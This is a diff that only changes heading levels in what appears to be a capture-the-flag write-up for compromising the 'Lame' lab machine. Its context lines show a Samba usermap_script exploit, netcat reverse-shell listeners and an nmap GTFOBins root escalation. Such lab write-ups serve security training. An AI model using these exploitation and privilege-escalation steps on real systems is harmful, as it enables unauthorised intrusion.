@@ -67,7 +67,7 @@ use exploit/multi/samba/usermap_script
 
 **Rooted**
 
-# B)Manually exploit SMB
+## B)Manually exploit SMB
 
 smbclient 10.10.10.3/tmp
 
@@ -83,7 +83,7 @@ nc -lvpn 4444
 
 **Rooted**
 
-# Samba exploit script written in Python
+## Samba exploit script written in Python
 If you find an exploit written in Python you could modify the variables, or you can run line by line yourself.
 
 
@@ -124,7 +124,7 @@ ls -la /usr/share/nmap/scripts/*distcc*
 **Attacker:**
 $ nc -lnvp 9999
 
-# A)GTFobins nmap
+## A)GTFobins nmap
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -139,7 +139,7 @@ uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
-# B)Kernel Exploit
+## B)Kernel Exploit
 **uname -a**
 
 Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
